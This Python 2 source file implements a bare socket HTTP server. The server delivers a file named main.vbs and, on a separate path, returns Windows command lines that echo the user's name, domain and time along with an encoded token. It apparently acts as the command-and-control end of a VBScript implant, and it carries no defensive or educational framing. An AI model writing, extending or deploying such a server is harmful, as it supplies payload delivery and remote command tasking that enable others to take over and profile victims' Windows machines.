import socket,sys,urllib
from threading import Thread
import os,urlparse
import argparse
import requests,time,json
from time import sleep
from firebase import firebase

fb = firebase.FirebaseApplication(os.environ['fbur'],authentication=None)
fb.authentication = fb.FirebaseAuthentication(os.environ['fbpw'],os.environ['fbem'])

PORT = int(sys.argv[1])

class Client(Thread):
    def __init__(self,cs,ca):
        Thread.__init__(self)
        self.cs = cs
        self.ca = ca
    def run(self):
        handle(self,self.cs,self.ca)
def handle(self,client,client_address):
    req = client.recv(65535)
    res = 'HTTP/1.1 200 OK\r\n'
    try:
        path = req.split(" ",3)[1][1:]
        data = path
        if (path.find("?") == -1 and path == '') or path.find('?') == 0:
            data = index(path)
            res = res+'Content-Type: text/html\r\n'
        elif path.startswith("v"):
            data = str(mvbs(path))
            res = res+'Content-Type: text/plain\r\n'
        elif path.startswith("x"):
            data = str(x(path))
            res = res+'Content-Type: text/plain\r\n'
        res = res+'\r\n'+data
    except Exception as e:
        res = res+repr(e)#.replace('\n','<br>')
    client.sendall(res)
    client.close()

def index(path):
    with open('index.html') as f:
        return f.read();
    #return firebase
    return ''

def mvbs(path):
    with open('main.vbs') as f:
        return f.read();
    return ''

def x(path):
    xt = path[2:].split('&')
    dt = dict()
    for xtz in xt:
        dtz = xtz.split('=')
        if len(dtz) == 2:
            dt[dtz[0]] = dtz[1]
    #return str(dt)
    #t = dt['t'].replace('+', ' ')
    
    return "echo %TIME% %DATE% %USERNAME% %USERDOMAIN% %RANDOM% *VkcxR2ExcFhWblU9* test"

listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listen_socket.bind(('', PORT))
listen_socket.listen(1)
print 'Serving HTTP on port %s ...' % PORT
while True:
    client, client_address = listen_socket.accept()
    c = Client(client,client_address)
    c.start()
